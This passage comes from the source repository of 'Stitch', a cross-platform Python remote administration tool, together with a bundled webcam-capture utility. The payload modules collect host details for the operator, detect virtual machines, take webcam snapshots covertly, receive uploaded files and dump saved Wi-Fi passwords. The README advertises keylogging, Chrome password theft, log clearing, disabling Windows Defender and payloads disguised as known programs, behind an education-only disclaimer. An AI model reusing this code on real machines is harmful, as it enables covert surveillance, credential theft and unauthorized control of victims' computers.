    is_admin = os.getuid() == 0
except AttributeError:
    is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.connect(("8.8.8.8",80))
ip =(s.getsockname()[0])
s.close()
if win_client():
    os.chdir(os.path.join(os.getenv('userprofile'),'Desktop'))
    user = os.getenv('username')
    arch = run_command('wmic os get osarchitecture').split('\n')[1]
else:
    user = run_command("whoami").strip().replace("\\","-")
    arch = run_command('uname -m')
    if 'x86_64' in arch:
        arch = '64-bit'
    else:
        arch = '32-bit'
time = "{}{}{}".format(str(hour),strftime(":%M:%S "),am_pm)
date = strftime("%m/%d/%Y")
stinfo = (  "   OS{8:25}: {0}"
            "\n   Architecture{8:15}: {1}"
            "\n   User{8:23}: {2}"
            "\n   Admin Rights{8:15}: {3}"
            "\n   Network IP{8:17}: {4}"
            "\n   Network Name{8:15}: {5}\n"
            "\n   Date{8:23}: {6}"
            "\n   Time{8:23}: {7}\n"
).format(platform.platform(),arch,user,str(is_admin),ip,platform.node(),date,time," ")
send(client_socket,stinfo)

```

`PyLib/uascan.py`:

```py
# Copyright (c) 2017, Nathan Lopez
# Stitch is under the MIT license. See the LICENSE file at the root of the project for the detailed license terms.

import _winreg
import subprocess

def check_uac():
    uac_key = _winreg.OpenKey(_winreg.HKEY_LOCAL_MACHINE, 'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System')
    val=_winreg.QueryValueEx(uac_key, "EnableLUA")
    if val[0] == 1:
        return "\nUAC is Enabled"
    else:
        return "\nUAC is Disabled"

print check_uac()

```

`PyLib/unhide.py`:

```py
# Copyright (c) 2017, Nathan Lopez
# Stitch is under the MIT license. See the LICENSE file at the root of the project for the detailed license terms.

f_name = receive(client_socket)
system = sys.platform
if os.path.exists(f_name):
    if win_client():
        resp = run_command("attrib -H {}".format(f_name))
    if osx_client():
        resp = run_command("chflags nohidden {}".format(f_name))
    if lnx_client() and not f_name.startswith('.'):
        resp = '[*] File is already unhidden.\n'
    elif lnx_client():
        resp = run_command("mv {} {}".format(f_name,f_name[1:]))
else:
    if lnx_client() and f_name.startswith('.'):
        if os.path.exists(f_name[1:]):
            resp = '[*] File is already unhidden.\n'
    else:
        resp = "[!] {}: No such file or directory\n".format(f_name)
send(client_socket,resp)

```

`PyLib/upload.py`:

```py
# Copyright (c) 2017, Nathan Lopez
# Stitch is under the MIT license. See the LICENSE file at the root of the project for the detailed license terms.

import os
import sys
import zipfile

if win_client():
    temp = 'C:\\Windows\\Temp\\'
else:
    temp = '/tmp/'

dwld_contents = ''
l_filename = receive(client_socket)
if l_filename != 'ERROR':
    d_fin = ''
    zip_loc = os.path.join(temp,l_filename)
    with open (zip_loc,'wb') as load_file:
        while True:
            d_fin = receive(client_socket)
            if d_fin != 'upload complete':
                load_file.write(d_fin)
            else:
                break
    with zipfile.ZipFile(zip_loc, "r") as z:
        z.extractall(os.getcwd())
    os.remove(zip_loc)
    send(client_socket,'[+] Upload Successful!\n')

```

`PyLib/vmscan.py`:

```py
# Copyright (c) 2017, Nathan Lopez
# Stitch is under the MIT license. See the LICENSE file at the root of the project for the detailed license terms.
# This is the python inspired version of: https://github.com/rapid7/metasploit-framework/blob/master/scripts/meterpreter/checkvm.rb

if win_client():
    import _winreg
    process = run_command('wmic process get name')
    process_list = process.split('\n')

    def enum_keys(reg):
        if reg:
            keys = []
            try:
                i = 0
                while 1:
                    name = _winreg.EnumKey(reg, i)
                    keys.append(name)
                    i += 1
            except WindowsError as e:
                return keys
        else:
            return False

    def check_processes(exe,vm=False):
        global process_list
        if exe in process_list:
            if vm:
                return ("VM Scan Complete: This is a %s Virtual Machine" % vm)
        return False

    def hyperv_scan(microsoft, services):
        #print "Scanning for Hyper-V..."
        if "Hyper-V" in microsoft or "VirtualMachine" in microsoft:
            return ("VM Scan Complete: This is a Hyper-V Virtual Machine.")
        return False

    def vmware_scan(services, luid):
        #print "Scanning for VMware..."
        vmware_svc = ['vmdebug','vmmouse','VMTools','VMMEMCTL']
        for s in vmware_svc:
            if s in services :
                return ("VM Scan Complete: This is a VMware Virtual Machine.")
        if luid:
            iD =_winreg.QueryValueEx(luid, 'Identifier')
            if 'vmware' in str(iD[0]).lower():
                return ("VM Scan Complete: This is a VMware Virtual Machine.")
        return False

    def virtualpc_scan(services):
        #print "Scanning for VirtualPC..."
        virtpc_svc = ['vpcbus','vpc-s3','vpcuhub','msvmmouf']
        for s in virtpc_svc:
            if s in services :
                return ("VM Scan Complete: This is a VirtualPC Virtual Machine.")
        return False

    def sunvirtual_scan(services,luid,dsys,dsdtkey,fadtkey):
        #print "Scanning for Sun VirtualBox..."
        virtpc_svc = ['VBoxMouse','VBoxGuest','VBoxService','VBoxSF']
        for s in virtpc_svc:
            if s in services :
                return ("VM Scan Complete: This is a Sun VirtualBox Virtual Machine.")
        if luid:
            iD =_winreg.QueryValueEx(luid, 'Identifier')
            if 'vbox' in str(iD[0]).lower():
                return ("VM Scan Complete: This is a Sun VirtualBox Virtual Machine.")
        if dsys:
            sysbios =_winreg.QueryValueEx(dsys, 'SystemBiosVersion')
            if 'vbox' in str(sysbios[0]).lower():
                return ("VM Scan Complete: This is a Sun VirtualBox Virtual Machine.")
        if "VBOX__" in dsdtkey or "VBOX__" in fadtkey:
            return ("VM Scan Complete: This is a Sun VirtualBox Virtual Machine.")
        return False

    def xen_scan(services,dsdtkey,fadtkey,rsdtkey):
        #print "\nScanning for Xen..."
        virtpc_svc = ['xenevtchn','xennet','xennet6','xensvc','xenvdb']
        for s in virtpc_svc:
            if s in services :
                return ("VM Scan Complete: This is a Xen Virtual Machine.")
        if "Xen" in dsdtkey or "Xen" in fadtkey or "Xen" in rsdtkey:
            return ("VM Scan Complete: This is a Xen Virtual Machine.")
        return False

    def qemu_kvm_scan(luid,sycp):
        #print "Scanning for QEMU/KVM..."
        if luid:
            iD =_winreg.QueryValueEx(luid, 'Identifier')
            if 'qemu' in str(iD[0]).lower():
                return ("VM Scan Complete: This is a QEMU/KVM Virtual Machine.")
        if sycp:
            cp =_winreg.QueryValueEx(sycp, 'ProcessorNameString')
            if 'qemu' in str(cp[0]).lower():
                return ("VM Scan Complete: This is a QEMU/KVM Virtual Machine.")
        return False

    def find_luid():
        i = 0
        n = 0
        luid = False
        while i < 4:
            while n < 4:
                try:
                    luid = _winreg.OpenKey(_winreg.HKEY_LOCAL_MACHINE, 'HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port %i\\Scsi Bus %i\\Target Id 0\\Logical Unit Id 0' % (i,n))
                    break
                except Exception:
                    n += 1
                    pass
            i += 1
        return luid

    def try_openkey(path):
        try:
            return _winreg.OpenKey(_winreg.HKEY_LOCAL_MACHINE, path)
        except Exception as e:
            return False

    micr = try_openkey('SOFTWARE\\Microsoft')
    dsdt = try_openkey('HARDWARE\\ACPI\\DSDT')
    fadt = try_openkey('HARDWARE\\ACPI\\FADT')
    rsdt = try_openkey('HARDWARE\\ACPI\\RSDT')
    dsys = try_openkey('HARDWARE\\DESCRIPTION\\System')
    srvc = try_openkey('SYSTEM\\ControlSet001\\Services')
    sycp = try_openkey('HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0')
    luid = find_luid()

    srvc_keys = enum_keys(srvc)
    dsdt_keys = enum_keys(dsdt)
    fadt_keys = enum_keys(fadt)
    rsdt_keys = enum_keys(rsdt)
    sycp_keys = enum_keys(sycp)
    micr_keys = enum_keys(micr)

    vm = xen_scan(srvc_keys,dsdt_keys,fadt_keys,rsdt_keys)
    if not vm: vm = vmware_scan(srvc_keys,luid)
    if not vm: vm = hyperv_scan(micr_keys, srvc_keys)
    if not vm: vm = qemu_kvm_scan(luid,sycp)
    if not vm: vm = virtualpc_scan(srvc_keys)
    if not vm: vm = sunvirtual_scan(srvc_keys,luid,dsys,dsdt_keys,fadt_keys)

    if not vm: vm = check_processes("vmwareuser.exe",'VMware')
    if not vm: vm = check_processes("vmwaretray.exe",'VMware')
    if not vm: vm = check_processes("vmusrvc.exe",'VirtualPC')
    if not vm: vm = check_processes("vmsrvc.exe",'VirtualPC')
    if not vm: vm = check_processes("vboxservice.exe",'Sun VirtualBox')
    if not vm: vm = check_processes("vboxtray.exe",'Sun VirtualBox')
    if not vm: vm = check_processes("xenservice.exe",'Xen')

    if not vm: vm = "[+] VM Scan Complete: Appears to be a physical host\n"
    send(client_socket,vm)

elif osx_client():
    vm = False
    vms = ['VirtualBox','Oracle','VMWare','Parallels','Qemu',
            'Microsoft VirtualPC','Virtuozzo','Xen']
    output=run_command("ioreg -l | grep -e Manufacturer -e 'Vendor Name'")
    for n in vms:
        if n.lower() in output.lower():
            vm = "[+] VM Scan Complete: This is a {} Virtual Machine.\n".format(n)
    if not vm: vm = "[+] VM Scan Complete: Appears to be a physical host\n"
    send(client_socket,vm)

elif lnx_client():
    vm = False
    vms = ['VirtualBox','Oracle','VMWare','Parallels','Qemu',
            'Microsoft VirtualPC','Virtuozzo','Xen']
    sys_vendor = 'cat /sys/class/dmi/id/sys_vendor'
    disk_by_id = 'ls /dev/disk/by-id/'
    scsi = 'cat /proc/scsi/scsi'

    vmcheck1 = run_command(sys_vendor)
    vmcheck2 = run_command(disk_by_id)
    vmcheck3 = run_command(scsi)

    for n in vms:
        if n.lower() in vmcheck1.lower():
            vm = "[+] VM Scan Complete: This is a {} Virtual Machine.\n".format(n)
            break
        if n.lower() in vmcheck2.lower():
            vm = "[+] VM Scan Complete: This is a {} Virtual Machine.\n".format(n)
            break
        if n.lower() in vmcheck3.lower():
            vm = "[+] VM Scan Complete: This is a {} Virtual Machine.\n".format(n)
            break
    if not vm: vm = "[+] VM Scan Complete: Appears to be a physical host\n"
    send(client_socket,vm)

```

`PyLib/webcamList.py`:

```py
# Copyright (c) 2017, Nathan Lopez
# Stitch is under the MIT license. See the LICENSE file at the root of the project for the detailed license terms.

if win_client():
    i = 0
    names = ''
    while True:
        try:
            dev = vidcap.new_Dev(i, 0)
            names += '   {}. {}\n'.format(i,dev.getdisplayname())
        except Exception as e:
            if i == 0:
                send(client_socket,"=== Webcam List ===")
                send(client_socket,"   No video devices detected.\n")
                break
            else:
                send(client_socket,"=== Webcam List ===")
                send(client_socket,names)
                break
        else:
            i += 1
else:
    if not os.path.exists('/tmp/.st_imsnp'):
        send(client_socket,'upload_imgsnap')
        current_dir = os.getcwd()
        temp = '/tmp/'
        dwld_contents = ''
        l_filename = receive(client_socket)
        if l_filename != 'ERROR':
            d_fin = ''
            zip_loc = os.path.join(temp,l_filename)
            with open (zip_loc,'wb') as load_file:
                while True:
                    d_fin = receive(client_socket)
                    if d_fin != 'upload complete':
                        load_file.write(d_fin)
                    else:
                        break
            with zipfile.ZipFile(zip_loc, "r") as z:
                z.extractall(temp)
            os.remove(zip_loc)
            send(client_socket,'[+] Upload Successful!\n')
    else:
        send(client_socket,'st_continue')
    run_command('chmod +x /tmp/.st_imsnp')
    cam_list = run_command('/tmp/.st_imsnp -l')
    send(client_socket,"=== Webcam List ===")
    send(client_socket,cam_list)

```

`PyLib/webcamSnap.py`:

```py
# Copyright (c) 2017, Nathan Lopez
# Stitch is under the MIT license. See the LICENSE file at the root of the project for the detailed license terms.

try:
    if win_client():
        cam = int(receive(client_socket))
        dev = vidcap.new_Dev(cam, 0)
        buffer, width, height = dev.getbuffer()
        img = Image.frombytes('RGB', (width, height), buffer, 'raw', 'BGR', 0, -1)
        img.save("C:\\Windows\\Temp\\wb.jpg", quality=95, optimize=True, progressive=True)
        send(client_socket,"[+] Webcam snapshot successful\n")
    else:
        cam = receive(client_socket)
        if not os.path.exists('/tmp/.st_imsnp'):
            send(client_socket,'upload_imgsnap')
            current_dir = os.getcwd()
            temp = '/tmp/'
            dwld_contents = ''
            l_filename = receive(client_socket)
            if l_filename != 'ERROR':
                d_fin = ''
                zip_loc = os.path.join(temp,l_filename)
                with open (zip_loc,'wb') as load_file:
                    while True:
                        d_fin = receive(client_socket)
                        if d_fin != 'upload complete':
                            load_file.write(d_fin)
                        else:
                            break
                with zipfile.ZipFile(zip_loc, "r") as z:
                    z.extractall(temp)
                os.remove(zip_loc)
                send(client_socket,'[+] Upload Successful!\n')
        else:
            send(client_socket,'st_continue')
        run_command('chmod +x /tmp/.st_imsnp')
        if 'st_continue' not in cam:
            cam_list = run_command('/tmp/.st_imsnp -l')
            resp=run_command('/tmp/.st_imsnp -d {} -w 1 /tmp/wb.jpg'.format(cam))
        else:
            resp=run_command('/tmp/.st_imsnp -w 1 /tmp/wb.jpg')
        if no_error(resp):
            send(client_socket,"[+] Webcam snapshot successful\n")
        else:
            send(client_socket,resp)
except Exception as e:
    send(client_socket,"[!] Webcam snaphot failed\n".format(e))

```

`PyLib/wifikeys.py`:

```py
# Copyright (c) 2017, Nathan Lopez
# Stitch is under the MIT license. See the LICENSE file at the root of the project for the detailed license terms.

import re
import sys
import subprocess

def get_profiles():
    passwd=''
    netsh_output = run_command("netsh wlan show profiles")
    if "not running" in netsh_output:
        net_wlan = run_command("net start wlansvc")
        if "started successfully" in net_wlan:
            netsh_output = run_command("netsh wlan show profiles")
        else:
            return net_wlan
    if "no wireless interface" in netsh_output:
        return netsh_output
    else:
        profiles=re.findall(': (.*)\r',netsh_output)
        for x in profiles:
            output= run_command('netsh wlan show profiles "{}" key=clear'.format(x))
            #output=re.findall('(Key Content.*)\r',proc)
            if output:
                passwd += "\n{}\n{}\n\n".format(x,output)
        return passwd

resp=get_profiles()
send(client_socket,resp)

```

`README.md`:

```md
# DISCLAIMER
**Stitch is for education/research purposes only. The author takes NO responsibility and/or liability for how you choose to use any of the tools/source code/any files provided.
 The author and anyone affiliated with will not be liable for any losses and/or damages in connection with use of ANY files provided with Stitch.
 By using Stitch or any files included, you understand that you are AGREEING TO USE AT YOUR OWN RISK. Once again Stitch and ALL files included are for EDUCATION and/or RESEARCH purposes ONLY.
 Stitch is ONLY intended to be used on your own pentesting labs, or with explicit consent from the owner of the property being tested.** 


# About Stitch
A Cross Platform Python Remote Administration Tool:

This is a cross platform python framework which allows you to build custom payloads for Windows, Mac OSX and Linux as well. You are able to select whether the payload binds to a specific IP and port, listens for a connection on a port, option to send an email of system info when the system boots, and option to start keylogger on boot. Payloads created can only run on the OS that they were created on.

## Features
### Cross Platform Support
- Command and file auto-completion
- Antivirus detection 
- Able to turn off/on display monitors
- Hide/unhide files and directories
- View/edit the hosts file
- View all the systems environment variables
- Keylogger with options to view status, start, stop and dump the logs onto your host system
- View the location and other information of the target machine 
- Execute custom python scripts which return whatever you print to screen
- Screenshots
- Virtual machine detection
- Download/Upload files to and from the target system
- Attempt to dump the systems password hashes
- Payloads' properties are "disguised" as other known programs

### Windows Specific
- Display a user/password dialog box to obtain user password
- Dump passwords saved via Chrome
- Clear the System, Security, and Application logs
- Enable/Disable services such as RDP,UAC, and Windows Defender
- Edit the accessed, created, and modified properties of files
- Create a custom popup box
- View connected webcam and take snapshots
- View past connected wifi connections along with their passwords
- View information about drives connected 
- View summary of registry values such as DEP

### Mac OSX Specific
- Display a user/password dialog box to obtain user password
- Change the login text at the user's login screen
- Webcam snapshots

### Mac OSX/Linux Specific
- SSH from the target machine into another host
- Run sudo commands
- Attempt to bruteforce the user's password using the passwords list found in Tools/
- Webcam snapshots? (untested on Linux)

## Implemented Transports
All communication between the host and target is AES encrypted. Every Stitch program generates an AES key which is then put into all payloads. To access a payload the AES keys must match. To connect from a different system running Stitch you must add the key by using the showkey command from the original system and the addkey command on the new system. 

## Implemented Payload Installers
The "stitchgen" command gives the user the option to create [NSIS](http://nsis.sourceforge.net/Main_Page) installers on Windows and [Makeself](http://stephanepeter.com/makeself/) installers on posix machines. For Windows, the installer packages the payload and an elevation exe ,which prevents the firewall prompt and adds persistence, and places the payload on the system. For Mac OSX and Linux, the installer places the payload and attempts to add persistence. To create NSIS installers you must [download](http://nsis.sourceforge.net/Download) and install NSIS. 

## Wiki
* [Crash Course of Stitch](https://github.com/nathanlopez/Stitch/wiki/Crash-Course)

## Requirements
- [Python 2.7](https://www.python.org/downloads/)

For easy installation run the following command that corresponds to your OS:
```
# for Windows
pip install -r win_requirements.txt

# for Mac OSX
pip install -r osx_requirements.txt

# for Linux
pip install -r lnx_requirements.txt
```

- [Pycrypto](https://pypi.python.org/pypi/pycrypto)
- [Requests](http://docs.python-requests.org/en/master/)
- [Colorama](https://pypi.python.org/pypi/colorama)
- [PIL](https://pypi.python.org/pypi/PIL)

### Windows Specific
- [Py2exe](http://www.py2exe.org/)
- [pywin32](https://sourceforge.net/projects/pywin32/)

### Mac OSX Specific
- [PyObjC](https://pythonhosted.org/pyobjc/)

### Mac OSX/Linux Specific
- [PyInstaller](http://www.pyinstaller.org/)
- [pexpect](https://pexpect.readthedocs.io/en/stable/)

## To Run
```
python main.py
or
./main.py
```

## Motivation
My motivation behind this was to advance my knowledge of python, hacking, and just to see what I could accomplish. Was somewhat discouraged and almost abandoned this project when I found the amazing work done by [n1nj4sec](https://github.com/n1nj4sec/pupy), but still decided to put this up since I had already come so far. 

## Other open-source Python RATs for Reference
* [vesche/basicRAT](https://github.com/vesche/basicRAT)
* [n1nj4sec/pupy](https://github.com/n1nj4sec/pupy)

## Screenshots

![linux options](https://cloud.githubusercontent.com/assets/13227314/21706500/76fdb962-d37c-11e6-9284-093ad065aeca.PNG)
![win_options](https://cloud.githubusercontent.com/assets/13227314/21706517/80d977b4-d37c-11e6-9588-5cd1bb3ecf37.PNG)
![win_upload](https://cloud.githubusercontent.com/assets/13227314/21706518/83c8509e-d37c-11e6-9f6e-f86b3a696c1a.PNG)
![osx_download](https://cloud.githubusercontent.com/assets/13227314/21706506/79f54e96-d37c-11e6-928b-68a8c57df919.PNG)

## License

See [LICENSE](/LICENSE)

```

`Tools/ImageSnap-v0.2.5/ImageSnap.h`:

```h
//
//  ImageSnap.h
//  ImageSnap
//
//  Created by Robert Harder on 9/10/09.
//
#import <Cocoa/Cocoa.h>
#import <QTKit/QTKit.h>
#include "ImageSnap.h"

#define error(...) fprintf(stderr, __VA_ARGS__)
#define console(...) (!g_quiet && printf(__VA_ARGS__))
#define verbose(...) (g_verbose && !g_quiet && fprintf(stderr, __VA_ARGS__))

BOOL g_verbose = NO;
BOOL g_quiet = NO;
//double g_timelapse = -1;
NSString *VERSION = @"0.2.5";


@interface ImageSnap : NSObject {
    
    QTCaptureSession                    *mCaptureSession;
    QTCaptureDeviceInput                *mCaptureDeviceInput;
    QTCaptureDecompressedVideoOutput    *mCaptureDecompressedVideoOutput;
    CVImageBufferRef                    mCurrentImageBuffer;
}


/**
 * Returns all attached QTCaptureDevice objects that have video.
 * This includes video-only devices (QTMediaTypeVideo) and
 * audio/video devices (QTMediaTypeMuxed).
 *
 * @return autoreleased array of video devices
 */
+(NSArray *)videoDevices;

/**
 * Returns the default QTCaptureDevice object for video
 * or nil if none is found.
 */
+(QTCaptureDevice *)defaultVideoDevice;

/**
 * Returns the QTCaptureDevice with the given name
 * or nil if the device cannot be found.
 */
+(QTCaptureDevice *)deviceNamed:(NSString *)name;

/**
 * Writes an NSImage to disk, formatting it according
 * to the file extension. If path is "-" (a dash), then
 * an jpeg representation is written to standard out.
 */
+ (BOOL) saveImage:(NSImage *)image toPath: (NSString*)path;

/**
 * Converts an NSImage to raw NSData according to a given
 * format. A simple string search is performed for such
 * characters as jpeg, tiff, png, and so forth.
 */
+(NSData *)dataFrom:(NSImage *)image asType:(NSString *)format;



/**
 * Primary one-stop-shopping message for capturing an image.
 * Activates the video source, saves a frame, stops the source,
 * and saves the file.
 */
+(BOOL)saveSingleSnapshotFrom:(QTCaptureDevice *)device toFile:(NSString *)path;
+(BOOL)saveSingleSnapshotFrom:(QTCaptureDevice *)device toFile:(NSString *)path withWarmup:(NSNumber *)warmup;
+(BOOL)saveSingleSnapshotFrom:(QTCaptureDevice *)device toFile:(NSString *)path withWarmup:(NSNumber *)warmup withTimelapse:(NSNumber *)timelapse;

-(id)init;
-(void)dealloc;


-(BOOL)startSession:(QTCaptureDevice *)device;
-(NSImage *)snapshot;
-(void)stopSession;


@end

```

`Tools/ImageSnap-v0.2.5/ImageSnap.m`:

```m
//
//  ImageSnap.m
//  ImageSnap
//
//  Created by Robert Harder on 9/10/09.
//

#import "ImageSnap.h"


@interface ImageSnap()


- (void)captureOutput:(QTCaptureOutput *)captureOutput 
  didOutputVideoFrame:(CVImageBufferRef)videoFrame 
     withSampleBuffer:(QTSampleBuffer *)sampleBuffer 
       fromConnection:(QTCaptureConnection *)connection;

@end


@implementation ImageSnap



- (id)init{
	self = [super init];
    mCaptureSession = nil;
    mCaptureDeviceInput = nil;
    mCaptureDecompressedVideoOutput = nil;
	mCurrentImageBuffer = nil;
	return self;
}

- (void)dealloc{
	
	if( mCaptureSession )					[mCaptureSession release];
	if( mCaptureDeviceInput )				[mCaptureDeviceInput release];
	if( mCaptureDecompressedVideoOutput )	[mCaptureDecompressedVideoOutput release];
    CVBufferRelease(mCurrentImageBuffer);
    
    [super dealloc];
}


// Returns an array of video devices attached to this computer.
+ (NSArray *)videoDevices{
    NSMutableArray *results = [NSMutableArray arrayWithCapacity:3];
    [results addObjectsFromArray:[QTCaptureDevice inputDevicesWithMediaType:QTMediaTypeVideo]];
    [results addObjectsFromArray:[QTCaptureDevice inputDevicesWithMediaType:QTMediaTypeMuxed]];
    return results;
}

// Returns the default video device or nil if none found.
+ (QTCaptureDevice *)defaultVideoDevice{
	QTCaptureDevice *device = nil;
    
	device = [QTCaptureDevice defaultInputDeviceWithMediaType:QTMediaTypeVideo];
	if( device == nil ){
        device = [QTCaptureDevice defaultInputDeviceWithMediaType:QTMediaTypeMuxed];
	}
    return device;
}

// Returns the named capture device or nil if not found.
+(QTCaptureDevice *)deviceNamed:(NSString *)name{
    QTCaptureDevice *result = nil;
    
    NSArray *devices = [ImageSnap videoDevices];
	for( QTCaptureDevice *device in devices ){
        if ( [name isEqualToString:[device description]] ){
            result = device;
        }   // end if: match
    }   // end for: each device
    
    return result;
}   // end


// Saves an image to a file or standard out if path is nil or "-" (hyphen).
+ (BOOL) saveImage:(NSImage *)image toPath: (NSString*)path{
    
    NSString *ext = [path pathExtension];
    NSData *photoData = [ImageSnap dataFrom:image asType:ext];
    
    // If path is a dash, that means write to standard out
    if( path == nil || [@"-" isEqualToString:path] ){
        NSUInteger length = [photoData length];
        NSUInteger i;
        char *start = (char *)[photoData bytes];
        for( i = 0; i < length; ++i ){
            putc( start[i], stdout );
        }   // end for: write out
        return YES;
    } else {
        return [photoData writeToFile:path atomically:NO];
    }

    
    return NO;
}


/**
 * Converts an NSImage into NSData. Defaults to jpeg if
 * format cannot be determined.
 */
+(NSData *)dataFrom:(NSImage *)image asType:(NSString *)format{
    
    NSData *tiffData = [image TIFFRepresentation];
    
    NSBitmapImageFileType imageType = NSJPEGFileType;
    NSDictionary *imageProps = nil;
    
    
    // TIFF. Special case. Can save immediately.
    if( [@"tif"  rangeOfString:format options:NSCaseInsensitiveSearch].location != NSNotFound ||
	    [@"tiff" rangeOfString:format options:NSCaseInsensitiveSearch].location != NSNotFound ){
        return tiffData;
    }
    
    // JPEG
    else if( [@"jpg"  rangeOfString:format options:NSCaseInsensitiveSearch].location != NSNotFound || 
             [@"jpeg" rangeOfString:format options:NSCaseInsensitiveSearch].location != NSNotFound ){
        imageType = NSJPEGFileType;
        imageProps = [NSDictionary dictionaryWithObject:[NSNumber numberWithFloat:0.9] forKey:NSImageCompressionFactor];
        
    }
    
    // PNG
    else if( [@"png" rangeOfString:format options:NSCaseInsensitiveSearch].location != NSNotFound ){
        imageType = NSPNGFileType;
    }
    
    // BMP
    else if( [@"bmp" rangeOfString:format options:NSCaseInsensitiveSearch].location != NSNotFound ){
        imageType = NSBMPFileType;
    }
    
    // GIF
    else if( [@"gif" rangeOfString:format options:NSCaseInsensitiveSearch].location != NSNotFound ){
        imageType = NSGIFFileType;
    }
    
    NSBitmapImageRep *imageRep = [NSBitmapImageRep imageRepWithData:tiffData];
    NSData *photoData = [imageRep representationUsingType:imageType properties:imageProps];

    return photoData;
}   // end dataFrom



/**
 * Primary one-stop-shopping message for capturing an image.
 * Activates the video source, saves a frame, stops the source,
 * and saves the file.
 */

+(BOOL)saveSingleSnapshotFrom:(QTCaptureDevice *)device toFile:(NSString *)path{
    return [self saveSingleSnapshotFrom:device toFile:path withWarmup:nil];
}

+(BOOL)saveSingleSnapshotFrom:(QTCaptureDevice *)device toFile:(NSString *)path withWarmup:(NSNumber *)warmup{
    return [self saveSingleSnapshotFrom:device toFile:path withWarmup:warmup withTimelapse:nil];
}
     
+(BOOL)saveSingleSnapshotFrom:(QTCaptureDevice *)device 
                       toFile:(NSString *)path 
                   withWarmup:(NSNumber *)warmup 
                withTimelapse:(NSNumber *)timelapse{
    ImageSnap *snap;
    NSImage *image = nil;
    double interval = timelapse == nil ? -1 : [timelapse doubleValue];
    
    snap = [[ImageSnap alloc] init];            // Instance of this ImageSnap class
    verbose("Starting device...");
    if( [snap startSession:device] ){           // Try starting session
        verbose("Device started.\n");
        
        if( warmup == nil ){
            // Skip warmup
            verbose("Skipping warmup period.\n");
        } else {
            double delay = [warmup doubleValue];
            verbose("Delaying %.2lf seconds for warmup...",delay);
            NSDate *now = [[NSDate alloc] init];
            [[NSRunLoop currentRunLoop] runUntilDate:[now dateByAddingTimeInterval: [warmup doubleValue]]];
            [now release];
            verbose("Warmup complete.\n");
        }
        
        if ( interval > 0 ) {
            
            verbose("Time lapse: snapping every %.2lf seconds to current directory.\n", interval);
            
            NSDateFormatter *dateFormatter = [[NSDateFormatter alloc] init];
            [dateFormatter setDateFormat:@"yyyy-MM-dd_HH-mm-ss.SSS"];
            
            // wait a bit to make sure the camera is initialized
            //[[NSRunLoop currentRunLoop] runUntilDate:[NSDate dateWithTimeIntervalSinceNow: 1.0]];
            
            for (unsigned long seq=0; ; seq++)
            {
                NSDate *now = [[NSDate alloc] init];
                NSString *nowstr = [dateFormatter stringFromDate:now];
                
                verbose(" - Snapshot %5lu", seq);
                verbose(" (%s)\n", [nowstr UTF8String]);
                
                // create filename
                NSString *filename = [NSString stringWithFormat:@"snapshot-%05d-%s.jpg", seq, [nowstr UTF8String]];
                
                // capture and write
                image = [snap snapshot];                // Capture a frame
                if (image != nil)  {
                    [ImageSnap saveImage:image toPath:filename];
                    console( "%s\n", [filename UTF8String]);
                } else {
                    error( "Image capture failed.\n" );
                }
                
                // sleep
                [[NSRunLoop currentRunLoop] runUntilDate:[now dateByAddingTimeInterval: interval]];
                
                [now release];
            }

        } else {
            image = [snap snapshot];                // Capture a frame
            
        }
        //NSLog(@"Stopping...");
        [snap stopSession];                     // Stop session
        //NSLog(@"Stopped.");
    }   // end if: able to start session
    
    [snap release];
    
    if ( interval > 0 ){
        return YES;
    } else {
        return image == nil ? NO : [ImageSnap saveImage:image toPath:path];
    }
}   // end


/**
 * Returns current snapshot or nil if there is a problem
 * or session is not started.
 */
-(NSImage *)snapshot{
    verbose( "Taking snapshot...\n");
	
    CVImageBufferRef frame = nil;               // Hold frame we find
    while( frame == nil ){                      // While waiting for a frame
		
		//verbose( "\tEntering synchronized block to see if frame is captured yet...");
        @synchronized(self){                    // Lock since capture is on another thread
            frame = mCurrentImageBuffer;        // Hold current frame
            CVBufferRetain(frame);              // Retain it (OK if nil)
        }   // end sync: self
		//verbose( "Done.\n" );
		
        if( frame == nil ){                     // Still no frame? Wait a little while.
            [[NSRunLoop currentRunLoop] runUntilDate:[NSDate dateWithTimeIntervalSinceNow: 0.1]];
        }   // end if: still nothing, wait
		
    }   // end while: no frame yet
    
    // Convert frame to an NSImage
    NSCIImageRep *imageRep = [NSCIImageRep imageRepWithCIImage:[CIImage imageWithCVImageBuffer:frame]];
    NSImage *image = [[[NSImage alloc] initWithSize:[imageRep size]] autorelease];
    [image addRepresentation:imageRep];
	verbose( "Snapshot taken.\n" );
    
    return image;
}




/**
 * Blocks until session is stopped.
 */
-(void)stopSession{
	verbose("Stopping session...\n" );
    
    // Make sure we've stopped
    while( mCaptureSession != nil ){
		verbose("\tCaptureSession != nil\n");

		verbose("\tStopping CaptureSession...");
        [mCaptureSession stopRunning];
		verbose("Done.\n");

        if( [mCaptureSession isRunning] ){
			verbose( "[mCaptureSession isRunning]");
            [[NSRunLoop currentRunLoop] runUntilDate:[NSDate dateWithTimeIntervalSinceNow: 0.1]];
        }else {
            verbose( "\tShutting down 'stopSession(..)'" );
            if( mCaptureSession )					[mCaptureSession release];
            if( mCaptureDeviceInput )				[mCaptureDeviceInput release];
            if( mCaptureDecompressedVideoOutput )	[mCaptureDecompressedVideoOutput release];
            
            mCaptureSession = nil;
            mCaptureDeviceInput = nil;
            mCaptureDecompressedVideoOutput = nil;
        }   // end if: stopped
        
    }   // end while: not stopped
}


/**
 * Begins the capture session. Frames begin coming in.
 */
-(BOOL)startSession:(QTCaptureDevice *)device{
	
	verbose( "Starting capture session...\n" );
	
    if( device == nil ) {
		verbose( "\tCannot start session: no device provided.\n" );
		return NO;
	}
    
    NSError *error = nil;
    
    // If we've already started with this device, return
    if( [device isEqual:[mCaptureDeviceInput device]] &&
         mCaptureSession != nil &&
        [mCaptureSession isRunning] ){
        return YES;
    }   // end if: already running
	
    else if( mCaptureSession != nil ){
		verbose( "\tStopping previous session.\n" );
        [self stopSession];
    }   // end if: else stop session
    
	
	// Create the capture session
	verbose( "\tCreating QTCaptureSession..." );
    mCaptureSession = [[QTCaptureSession alloc] init];
	verbose( "Done.\n");
	if( ![device open:&error] ){
		error( "\tCould not create capture session.\n" );
        [mCaptureSession release];
        mCaptureSession = nil;
		return NO;
	}
    
	
	// Create input object from the device
	verbose( "\tCreating QTCaptureDeviceInput with %s...", [[device description] UTF8String] );
